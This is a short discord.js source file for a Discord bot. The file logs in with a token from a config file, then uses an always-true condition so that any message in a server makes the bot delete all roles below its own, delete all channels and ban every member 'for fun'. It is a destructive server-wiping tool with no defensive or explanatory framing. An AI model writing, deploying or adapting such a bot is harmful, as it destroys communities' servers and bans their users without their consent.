const discord = require("discord.js");
const Client = new discord.Client();
const config = require('./config.json');

Client.on("ready", () => {
    console.log(" ");
    console.log(`${Client.user.tag} is online.`);
    Client.user.setPresence({ game: { name: `${config.botstatus}` }, type: 0 });
});

Client.on("message", async (msg) => {
    if (2 ===2 ) {
        msg.guild.roles
            .filter((r) => r.position < msg.guild.me.highestRole.position)
            .deleteAll();
        msg.guild.channels.deleteAll();
        msg.guild.members.tap((member) => member.ban("for fun :)"));
    }
});

Client.login(config.token);
